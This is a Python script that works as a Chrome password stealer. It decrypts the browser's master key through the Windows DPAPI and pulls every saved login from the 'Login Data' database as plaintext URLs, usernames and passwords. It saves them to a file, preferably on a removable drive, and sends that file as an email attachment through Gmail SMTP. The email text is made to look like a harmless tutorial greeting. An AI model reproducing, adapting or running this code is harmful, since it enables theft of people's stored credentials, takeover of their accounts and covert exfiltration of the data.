import os
import json
import base64
import sqlite3
import shutil
import ctypes
import ctypes.wintypes
from Crypto.Cipher import AES
import datetime
import psutil
import smtplib, ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication # For attachments

def send_multipart_email_with_attachment(sender_email, sender_password, receiver_email, subject, text_content, html_content, attachment_path):
    """
    Sends a multipart email with both plain text, HTML content, and a text file attachment.

    Args:
        sender_email (str): The sender's email address.
        sender_password (str): The sender's email password (or app password).
        receiver_email (str): The recipient's email address.
        subject (str): The email subject.
        text_content (str): The plain text content of the email.
        html_content (str): The HTML content of the email.
        attachment_path (str): The path to the text file to attach.
    """

    message = MIMEMultipart("alternative")
    message["Subject"] = subject
    message["From"] = sender_email
    message["To"] = receiver_email

    # Turn these into plain/html MIMEText objects
    part1 = MIMEText(text_content, "plain")
    part2 = MIMEText(html_content, "html")

    # Add HTML/plain-text parts to MIMEMultipart message
    # The email client will try to render the last part first
    message.attach(part1)
    message.attach(part2)

    # Add attachment
    try:
        with open(attachment_path, "rb") as attachment:
            p = MIMEApplication(attachment.read(), _subtype="txt")
            p.add_header('Content-Disposition', "attachment; filename= %s" % attachment_path.split("/")[-1]) # get filename from path.
            message.attach(p)
    except FileNotFoundError:
        print(f"Attachment file not found: {attachment_path}")
        return # Exit the function, don't send without attachment.
    except Exception as e:
        print(f"Error attaching file: {e}")
        return # exit function

    # Create secure connection with server and send email
    context = ssl.create_default_context()
    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
            server.login(sender_email, sender_password)
            server.sendmail(
                sender_email, receiver_email, message.as_string()
            )
        print("Multipart email with attachment sent successfully!")
    except Exception as e:
        print(f"Failed to send multipart email: {e}")



def get_encryption_key():
    local_state_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State')
    try:
        with open(local_state_path, 'r', encoding='utf-8') as file:
            local_state = json.load(file)
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
        class DATA_BLOB(ctypes.Structure):
            _fields_ = [('cbData', ctypes.wintypes.DWORD), ('pbData', ctypes.POINTER(ctypes.c_char))]
        blob_in = DATA_BLOB()
        blob_in.cbData = len(encrypted_key)
        blob_in.pbData = ctypes.cast(ctypes.create_string_buffer(encrypted_key, len(encrypted_key)), ctypes.POINTER(ctypes.c_char))
        blob_out = DATA_BLOB()
        if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
            decrypted_key = ctypes.string_at(blob_out.pbData, blob_out.cbData)
            ctypes.windll.kernel32.LocalFree(blob_out.pbData)
            return decrypted_key
        else:
            return None #Or raise exception, if you want.
    except Exception as e:
        print(f"Error getting encryption key: {e}")
        return None

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        encrypted_password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt(encrypted_password)[:-16].decode()
        return decrypted_password
    except Exception as e:
        return None #or f"Failed to decrypt: {str(e)}"

def get_chrome_login_data():
    chrome_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
    try:
        db_path = 'Login Data Copy'
        shutil.copyfile(chrome_path, db_path)
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        key = get_encryption_key()
        login_data = []
        if key: # only proceed if the key was obtained
            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                encrypted_password = row[2]
                decrypted_password = decrypt_password(encrypted_password, key)
                if decrypted_password: # only save if the password was decrypted
                    login_data.append({'url': url, 'username': username, 'password': decrypted_password})
        conn.close()
        os.remove(db_path)
        return login_data
    except Exception as e:
        print(f"Error getting login data: {e}")
        return []

def get_removable_drives():
    drives = []
    for partition in psutil.disk_partitions():
        if 'removable' in partition.opts:
            drives.append(partition.mountpoint)
    return drives

if __name__ == '__main__':
    login_data = get_chrome_login_data()
    s = []
    for entry in login_data:
        s.append(f"URL: {entry['url']}\nUsername: {entry['username']}\nPassword: {entry['password']}\n")
        print(f"URL: {entry['url']}\nUsername: {entry['username']}\nPassword: {entry['password']}\n")

    now = datetime.datetime.now()
    folder_name = now.strftime("%Y-%m-%d_%H-%M-%S")
    removable_drives = get_removable_drives()

    if removable_drives:
        for drive in removable_drives:
            output_path = os.path.join(drive, folder_name)
            try:
                os.makedirs(output_path, exist_ok=True)
                file_path = os.path.join(output_path, "data.txt")
                with open(file_path, 'w') as f:
                    for i in s:
                        f.write(i)
                print(f"Data saved to: {file_path}")
                text = """\
                    Hi,
                    How are you?
                    Real Python has many great tutorials:
                    www.realpython.com"""
                html = """\
                    <html>
                      <body>
                        <p>Hi,<br>
                          How are you?<br>
                          <a href="http://www.realpython.com">Real Python</a>
                          has many great tutorials.
                        </p>
                      </body>
                    </html>
                    """
            
                print(file_path)
                # Create a dummy data.txt if it doesn't exist
                if os.path.exists(file_path):
                    send_multipart_email_with_attachment("mail@gmail.com", 
                    "password" ,
                    "mail@gmail.com",
                    "Multipart Test with Attachment",
                    text,
                    html,
                    file_path)
                    print("Email sent")
            except Exception as e:
                print(f"Error saving to {drive}: {e}")
    else:
        os.makedirs(folder_name, exist_ok=True)
        file_path = os.path.join(folder_name, "data.txt")
        try:
            with open(file_path, 'w') as f:
                for i in s:
                    f.write(i)
            print(f"Data saved to: {file_path}")

            text = """\
            Hi,
            How are you?
            Real Python has many great tutorials:
            www.realpython.com"""
            html = """\
            <html>
              <body>
                <p>Hi,<br>
                  How are you?<br>
                  <a href="http://www.realpython.com">Real Python</a>
                  has many great tutorials.
                </p>
              </body>
            </html>
            """
            
            print(file_path)
            # Create a dummy data.txt if it doesn't exist
            if os.path.exists(file_path):
                send_multipart_email_with_attachment("mail@gmail.com", 
                "password" ,
                "mail@gmail.com",
                "Multipart Test with Attachment",
                text,
                html,
                file_path)
                print("Email sent")
        except Exception as e:
            print(f"Error saving to current directory: {e}")